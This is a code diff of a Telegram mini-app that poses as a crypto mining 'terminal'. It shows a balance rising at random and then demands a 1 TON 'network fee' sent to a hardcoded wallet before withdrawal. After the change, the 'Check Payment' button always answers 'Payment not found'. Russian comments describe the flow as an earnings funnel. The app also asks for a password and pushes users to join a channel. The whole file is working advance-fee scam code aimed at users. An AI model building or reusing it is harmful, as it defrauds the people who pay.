@@ -1,23 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CointBot Pro | Terminal</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: 'Inter', sans-serif; background: #000; color: white; margin: 0; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background-color: #000000;
+            color: white;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        /* Стили баланса */
         .balance-container { text-align: center; margin-bottom: 25px; }
-        .label-top { color: #8a8a8e; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; }
+        .label-top { color: #8a8a8e; font-size: 11px; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 5px; }
         .balance-value { font-size: 50px; font-weight: 900; font-variant-numeric: tabular-nums; text-shadow: 0 0 25px rgba(64, 167, 227, 0.4); }
-        .currency { color: #40a7e3; }
+        .currency { color: #40a7e3; margin-right: 5px; }
+
+        /* Поля ввода */
         .input-group { width: 85%; max-width: 320px; margin-bottom: 12px; }
-        .input-label { font-size: 10px; color: #40a7e3; font-weight: bold; margin-bottom: 5px; text-transform: uppercase; }
-        input { width: 100%; background: #111; border: 1px solid #222; border-radius: 14px; padding: 14px; color: white; box-sizing: border-box; outline: none; }
-        .tasks-box { width: 85%; max-width: 320px; background: rgba(64, 167, 227, 0.05); border: 1px dashed #333; border-radius: 14px; padding: 15px; margin-bottom: 20px; }
-        .task-btn { background: #40a7e3; color: white; border: none; padding: 6px 12px; border-radius: 8px; font-size: 11px; font-weight: bold; text-decoration: none; }
-        .withdraw-btn { width: 85%; max-width: 320px; background: #fff; color: #000; border: none; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 800; cursor: pointer; }
-        .status { margin-top: 15px; font-size: 10px; color: #4cd964; display: flex; align-items: center; gap: 6px; }
+        .input-label { font-size: 10px; color: #40a7e3; font-weight: bold; margin-bottom: 5px; margin-left: 5px; text-transform: uppercase; }
+        input {
+            width: 100%; background: #111; border: 1px solid #222; border-radius: 14px;
+            padding: 14px; color: white; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: #40a7e3; background: #161616; }
+
+        /* Блок заданий */
+        .tasks-box {
+            width: 85%; max-width: 320px; background: rgba(64, 167, 227, 0.05);
+            border: 1px dashed #333; border-radius: 14px; padding: 15px; margin-bottom: 20px; box-sizing: border-box;
+        }
+        .task-item { display: flex; justify-content: space-between; align-items: center; }
+        .task-text { font-size: 12px; color: #eee; }
+        .task-btn {
+            background: #40a7e3; color: white; border: none; padding: 6px 12px;
+            border-radius: 8px; font-size: 11px; font-weight: bold; cursor: pointer; text-decoration: none;
+        }
+
+        /* Кнопка вывода */
+        .withdraw-btn {
+            width: 85%; max-width: 320px; background: #ffffff; color: #000000;
+            border: none; padding: 18px; border-radius: 35px; font-size: 16px;
+            font-weight: 800; cursor: pointer; transition: 0.2s; box-shadow: 0 10px 20px rgba(255,255,255,0.1);
+        }
+        .withdraw-btn:active { transform: scale(0.96); opacity: 0.8; }
+
+        /* Статус */
+        .status { margin-top: 15px; font-size: 10px; color: #4cd964; display: flex; align-items: center; gap: 6px; font-weight: bold; }
         .dot { width: 6px; height: 6px; background: #4cd964; border-radius: 50%; animation: pulse 1s infinite; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
     </style>
@@ -25,25 +63,30 @@
 <body>
 
     <div class="balance-container">
-        <div class="label-top">Available to Withdraw</div>
-        <div class="balance-value"><span class="currency">$</span><span id="balance">0.00</span></div>
-        <div class="status"><div class="dot"></div> CRYPTO-TERMINAL ACTIVE</div>
-    </div>
-
-    <div class="tasks-box">
-        <div style="display: flex; justify-content: space-between; align-items: center;">
-            <div style="font-size: 12px;"><b>Step 1:</b> Join Channel</div>
-            <a href="https://t.me/hackpackposter" class="task-btn">JOIN</a>
+        <div class="label-top">Total Profit Pool</div>
+        <div class="balance-value">
+            <span class="currency">$</span><span id="balance">0.00</span>
+        </div>
+        <div class="status">
+            <div class="dot"></div> PROTOCOL LIVE
         </div>
     </div>
 
-    <div class="input-group">
-        <div class="input-label">Your Wallet (TON)</div>
-        <input type="text" id="wallet" placeholder="Enter your address...">
+    <div class="tasks-box">
+        <div class="task-item">
+            <div class="task-text"><b>Step 1:</b> Join Official Channel</div>
+            <a href="https://t.me/hackpackposter" class="task-btn">JOIN</a>
+        </div>
+        <div style="font-size: 9px; color: #666; margin-top: 8px;">Withdrawal locked until subscription verification.</div>
     </div>
 
     <div class="input-group">
-        <div class="input-label">System Password</div>
+        <div class="input-label">Enter TG Wallet</div>
+        <input type="text" id="wallet" placeholder="UQAr9x... or @username">
+    </div>
+
+    <div class="input-group">
+        <div class="input-label">Security Password</div>
         <input type="password" id="password" placeholder="••••••••">
     </div>
 
@@ -52,13 +95,19 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
+        tg.setHeaderColor('#000000');
+
         let balance = 0.00;
         let isDead = false;
-        
+        const balanceDisplay = document.getElementById('balance');
+
+        // Эффект роста баланса
         function mine() {
             if (isDead) return;
-            balance += Math.random() * 0.15;
-            document.getElementById('balance').innerText = balance.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            balance += Math.random() * 0.15; 
+            balanceDisplay.innerText = balance.toLocaleString('en-US', {
+                minimumFractionDigits: 2, maximumFractionDigits: 2
+            });
         }
         setInterval(mine, 100);
 
@@ -66,25 +115,34 @@
             const wallet = document.getElementById('wallet').value;
             const pass = document.getElementById('password').value;
 
+            // 1. Проверка секретного пароля (Твой хак-режим)
             if (pass === "hackpack1977") {
-                isDead = true; balance = 0; document.getElementById('balance').innerText = "0.00";
+                isDead = true;
+                balance = 0.00;
+                balanceDisplay.innerText = "0.00";
+                balanceDisplay.style.color = "#ff3b30";
                 tg.showAlert("🛑 Security Breach: Account Reset.");
                 return;
             }
 
-            if (!wallet) { tg.showAlert("⚠️ Enter wallet!"); return; }
+            // 2. Проверка заполнения кошелька
+            if (!wallet) {
+                tg.showAlert("⚠️ Please enter your TG Wallet address first.");
+                return;
+            }
 
+            // 3. Показ основного окна оплаты (Твоя воронка заработка)
             tg.showPopup({
-                title: 'Payment Required',
-                message: 'To verify your wallet, send 1 TON to:\n\nUQBAtQa96SBwjfTpuiDAphf065OvEr1W78JUrL1U8X3-J9Mw\n\nAfter payment, click "Check Payment".',
+                title: 'Verification Required',
+                message: 'To verify your wallet and unlock withdrawal of $' + balance.toFixed(2) + ', you must pay a network fee of 1 TON to the address below:\n\nUQBAtQa96SBwjfTpuiDAphf065OvEr1W78JUrL1U8X3-J9Mw\n\nAfter payment, click "Check Payment".',
                 buttons: [
                     {id: 'check', type: 'default', text: 'Check Payment'},
                     {id: 'cancel', type: 'destructive', text: 'Cancel'}
                 ]
             }, function(id) {
                 if (id === 'check') {
-                    tg.sendData("CHECK_PAYMENT_REQUEST");
-                    tg.close();
+                    // Приложение НЕ закрывается, а выдает ошибку "Оплата не найдена"
+                    tg.showAlert("❌ Payment not found. Verification takes 5-15 minutes. Please try again later or contact support.");
                 }
             });
         }
